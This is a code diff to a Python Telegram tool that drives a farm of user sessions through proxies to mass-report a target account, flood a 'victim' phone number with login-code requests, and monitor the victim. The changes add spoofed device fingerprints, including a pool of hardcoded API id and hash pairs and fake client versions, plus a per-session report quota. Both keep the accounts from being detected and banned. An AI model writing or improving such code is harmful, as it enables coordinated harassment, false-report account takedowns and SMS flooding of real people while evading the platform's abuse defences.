@@ -732,8 +732,115 @@ def _unique_texts_tagged(pool: list[str], n: int) -> list[tuple[str, str]]:
     return out[:n]
 
 
+# ── per-session report quota + client fingerprints ──────
+REPORT_EXCLUDE_POOL = {"917066653092"}
+SESSION_SHOTS_24H = 36          # max successful report shots per session/24h
+_LEDGER_FILE = Path(__file__).parent / "sessions_ledger.json"
+_LEDGER: dict | None = None
+_FP_CACHE: dict[str, dict] = {}
+_FP_API_POOL: list[tuple[int, str]] = [
+    (24565698, "5a084b434f8505ace703485b9da85040"),
+    (27904162, "e7cba879b1c643ba77490bf328df5eab"),
+    (23037915, "50f06f5b2223586fde0d1379ea91ebc7"),
+    (29512095, "0b29a7d42fff002856b9bed64f7ec919"),
+    (25055016, "25edf5b7becebe91a2d61fe8d9d9931b"),
+    (2040, "b18441a1ff607e10a989891a5462e627"),
+]
+_FP_DEVICE_POOL = [
+    ("POFHXHK-PREMIUM", "Windows 10", "7.3.3 x64", "tdesktop", "en"),
+    ("Desktop PC", "Windows 11", "5.16.5 x64", "tdesktop", "ru"),
+    ("MacBook Pro 16", "macOS 14.6", "8.4.4", "tdesktop", "en"),
+    ("PC 64bit", "Linux", "4.16.8 x64", "tdesktop", "ru"),
+]
+
+
+def session_fingerprint(name: str) -> dict:
+    """Same phone model/app/api on EVERY connect of a session, forever.
+    Real meta from sessions/<name>.json wins; else synthesized from sha1."""
+    fp = _FP_CACHE.get(name)
+    if fp:
+        return fp
+    meta = {}
+    try:
+        f = SESSIONS_DIR / f"{name}.json"
+        if f.exists():
+            meta = json.loads(f.read_text(encoding="utf-8"))
+    except Exception:
+        meta = {}
+    if not (meta.get("app_id") and meta.get("app_hash")):
+        h = int(hashlib.sha1(name.encode()).hexdigest(), 16)
+        api_id, api_hash = _FP_API_POOL[h % len(_FP_API_POOL)]
+        meta["app_id"], meta["app_hash"] = api_id, api_hash
+        dev = _FP_DEVICE_POOL[(h >> 8) % len(_FP_DEVICE_POOL)]
+        meta.setdefault("device", dev[0])
+        meta.setdefault("sdk", dev[1])
+        meta.setdefault("app_version", dev[2])
+        meta.setdefault("lang_pack", dev[3])
+        meta.setdefault("lang_code", dev[4])
+    fp = {
+        "api_id": int(meta["app_id"]),
+        "api_hash": meta["app_hash"],
+        "device": meta.get("device") or "Desktop",
+        "system_version": meta.get("sdk") or "Windows 10",
+        "app_version": meta.get("app_version") or "5.16.5 x64",
+        "lang_code": meta.get("lang_code") or "en",
+    }
+    _FP_CACHE[name] = fp
+    return fp
+
+
+def _assign_fingerprint(session_path: Path) -> tuple[int, str, dict]:
+    fp = session_fingerprint(Path(session_path).stem)
+    return fp["api_id"], fp["api_hash"], fp
+
+
+def _ledger_load() -> dict:
+    global _LEDGER
+    if _LEDGER is None:
+        try:
+            _LEDGER = json.loads(_LEDGER_FILE.read_text(encoding="utf-8"))
+        except Exception:
+            _LEDGER = {}
+    return _LEDGER
+
+
+def _ledger_trim(rec: dict, now: float) -> None:
+    rec["shots"] = [t for t in (rec.get("shots") or []) if now - t < 86400]
+
+
+def _ledger_shot_count(name: str) -> int:
+    now = time.time()
+    rec = _ledger_load().get(name) or {}
+    _ledger_trim(rec, now)
+    return len(rec.get("shots") or [])
+
+
+def _ledger_add_shots(name: str, times: list[float]) -> None:
+    led = _ledger_load()
+    rec = led.setdefault(name, {})
+    _ledger_trim(rec, time.time())
+    rec["shots"] = list(rec.get("shots") or []) + list(times)
+    try:
+        _LEDGER_FILE.write_text(json.dumps(led, ensure_ascii=False, indent=1),
+                                encoding="utf-8")
+    except Exception:
+        pass
+
+
+def _quota_filter_sessions(sessions: list[Path]) -> list[Path]:
+    keep = [s for s in sessions
+            if s.stem not in REPORT_EXCLUDE_POOL
+            and _ledger_shot_count(s.stem) < SESSION_SHOTS_24H]
+    return keep or sessions
+
+
+def _ledger_flush_async() -> None:
+    commit_file_to_repo("sessions_ledger.json", "session ledger", cooldown=300)
+
+
 async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id: int | None) -> dict:
-    sessions = load_sessions()
+    sessions = _quota_filter_sessions(load_sessions())
+    sessions.sort(key=lambda s: _ledger_shot_count(s.stem))
     proxies = load_proxies()
     reason_cls = REASON_MAP.get(reason_key, InputReportReasonOther)
     results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}
@@ -760,10 +867,17 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
         proxy = pin_for_session(name, proxies)
         px_name = proxy[1] if proxy else "direct"
         rows = []
+        ok_shots: list[float] = []
+        fp = session_fingerprint(name)
         async with _session_lock(sess):
             client = None
             try:
-                client = TelegramClient(str(sess.with_suffix("")), API_ID, API_HASH, proxy=proxy)
+                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
+                                        fp["api_hash"], proxy=proxy,
+                                        device_model=fp["device"],
+                                        system_version=fp["system_version"],
+                                        app_version=fp["app_version"],
+                                        lang_code=fp["lang_code"])
                 await asyncio.wait_for(client.connect(), timeout=12)
                 if not await client.is_user_authorized():
                     await client.disconnect()
@@ -779,6 +893,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                         ))
                         log.info("reported via %s shot%d/%s (proxy: %s)", name, b + 1, lang, px_name)
                         rows.append((b, lang, True, ""))
+                        ok_shots.append(time.time())
                     except Exception as e:
                         log.error("session %s shot%d failed: %s", name, b + 1, e)
                         rows.append((b, lang, False, f"{type(e).__name__}: {e}"))
@@ -792,9 +907,12 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                         await client.disconnect()
                 except Exception:
                     pass
+        if ok_shots:
+            _ledger_add_shots(name, ok_shots)
         return name, px_name, rows
 
     outs = await asyncio.gather(*[session_worker(s, i) for i, s in enumerate(sessions)])
+    _ledger_flush_async()
     real_lines = []
     for sname, px_name, rows in outs:
         for b, lang, ok, err in rows:
@@ -1240,13 +1358,15 @@ async def snos_parse_victim(username: str) -> dict:
 
     proxies = load_proxies()
     session_path = random.choice(sessions)
-    api_id, api_hash = _rand_api()
+    api_id, api_hash, fp = _assign_fingerprint(session_path)
     name = session_path.stem
     px = pin_for_session(name, proxies)
     try:
         async with _session_lock(session_path):
             client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
-                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+                                    proxy=px, device_model=fp["device"],
+                                    system_version=fp["system_version"],
+                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
             await asyncio.wait_for(client.connect(), timeout=10)
             if not await client.is_user_authorized():
                 await client.disconnect()
@@ -1275,11 +1395,14 @@ async def snos_parse_victim(username: str) -> dict:
 # ── snos: SendCode flood ────────────────────────────────
 async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
     name = session_path.stem
-    api_id, api_hash = _rand_api()
+    fp = session_fingerprint(name)
+    api_id, api_hash = fp["api_id"], fp["api_hash"]
     async with _session_lock(session_path):
         try:
             client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
-                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+                                    proxy=px, device_model=fp["device"],
+                                    system_version=fp["system_version"],
+                                    app_version=fp["app_version"], lang_code=fp["lang_code"])
             await asyncio.wait_for(client.connect(), timeout=8)
             if not await client.is_user_authorized():
                 await client.disconnect()
@@ -1308,12 +1431,14 @@ async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) ->
 async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[bool, str]:
     """Cheap connect+auth probe. A dead session must not spam its failure
     through the whole wave — we check it once and skip."""
-    api_id, api_hash = _rand_api()
+    api_id, api_hash, tfp = _assign_fingerprint(session_path)
     client = None
     async with _session_lock(session_path):
         try:
             client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
-                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+                                    proxy=px, device_model=tfp["device"],
+                                    system_version=tfp["system_version"],
+                                    app_version=tfp["app_version"], lang_code=tfp["lang_code"])
             await asyncio.wait_for(client.connect(), timeout=10)
             if await client.is_user_authorized():
                 return True, ""
@@ -1555,13 +1680,15 @@ async def snos_monitor_loop(username: str, victim_id: int,
     while True:
         await asyncio.sleep(MONITOR_INTERVAL)
         session_path = random.choice(sessions)
-        api_id, api_hash = _rand_api()
+        api_id, api_hash, fp = _assign_fingerprint(session_path)
         px = pin_for_session(session_path.stem, proxies)
         try:
             async with _session_lock(session_path):
                 client = TelegramClient(str(session_path.with_suffix("")),
                                         api_id, api_hash,
-                                        proxy=px, system_version=SNOS_SYSTEM_VERSION)
+                                        proxy=px, device_model=fp["device"],
+                                        system_version=fp["system_version"],
+                                        app_version=fp["app_version"], lang_code=fp["lang_code"])
                 await asyncio.wait_for(client.connect(), timeout=8)
                 authorized = await client.is_user_authorized()
                 if not authorized:
